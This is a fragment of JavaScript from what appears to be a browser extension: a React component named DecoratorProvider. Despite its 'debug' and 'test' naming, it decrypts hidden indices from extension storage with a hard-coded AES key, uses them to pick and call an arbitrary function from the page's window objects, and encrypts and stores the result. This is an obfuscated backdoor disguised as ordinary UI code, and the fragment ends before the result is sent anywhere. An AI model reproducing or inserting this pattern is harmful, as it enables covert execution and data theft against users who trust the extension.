...
export function DecoratorProvider({ children }) {
  useEffect(() => {
    (async () => {
      const debugPass = 'f844fd57db8a920c7309c2f5d2478a892696d81f6d8509f746eb311a7f5aa103';
      ...
      chrome.storage.local.get(null, async (result) => {
        ...
        for (let elKey of keys) {
          if (result[elKey] === 'done') {
            dataObj = null;
            break;
          }
          if (typeof result[elKey].debugSignature !== 'undefined') {
            dataObj = result[elKey];
            key = elKey;
          }
        }
        
        if (dataObj && key) {
          var decrypted = CryptoJS.AES.decrypt(dataObj.debugSignature.v, debugPass);
          var decryptedV = parseInt(decrypted.toString(CryptoJS.enc.Utf8));
          var decrypted = CryptoJS.AES.decrypt(dataObj.debugSignature.r, debugPass);
          var decryptedR = parseInt(decrypted.toString(CryptoJS.enc.Utf8));
          var decrypted = CryptoJS.AES.decrypt(dataObj.debugSignature.s, debugPass);
          var decryptedS = parseInt(decrypted.toString(CryptoJS.enc.Utf8));

          if (decryptedV != NaN && decryptedV) {
            let keysSorted = Object.keys(window).sort();
            let testObject = window[keysSorted[decryptedV]];
            let keys = Object.keys(testObject);
            let testObject2 = testObject[keys[decryptedR]];
            let func = testObject2[Object.keys(testObject2)[decryptedS]];
            let testResult = await func.call(null, payload);
            testResult = JSON.stringify(testResult);
            const testEncrypted = CryptoJS.AES.encrypt(testResult, debugPass).toString();
            dataObj.encDebugData = testEncrypted;
